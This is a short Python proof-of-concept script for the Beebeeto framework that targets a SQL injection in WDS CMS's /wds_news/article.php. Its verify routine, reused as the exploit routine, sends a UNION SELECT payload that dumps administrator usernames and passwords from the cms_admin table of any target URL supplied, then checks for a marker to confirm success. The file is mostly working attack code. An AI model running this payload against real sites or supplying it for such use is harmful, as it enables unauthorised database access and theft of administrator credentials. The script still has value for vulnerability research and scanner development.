#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0131',
            'name': 'WDS CMS /wds_news/article.php SQL注入漏洞 POC',
            'author': 'rootsec',
            'create_date': '2015-08-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'wdsCMS',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['wdsCMS漏洞', 'allinurl:wds_news/article.php漏洞', 'php'],
            'desc': '''
                    wdsCMS SQL注入漏洞，漏洞位于/wds_news/article.php
                    ''',
            'references': ['https://www.exploit-db.com/exploits/37750/'],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/wds_news/article.php?ID=-1+union+select+1,group_concat(username,0x3a'
                   ',password),3,4,5,md5(567),6,7,8,9,10+from+cms_admin--')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if '99C5E07B4D5DE9D18C350CDF64C5AA3D' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())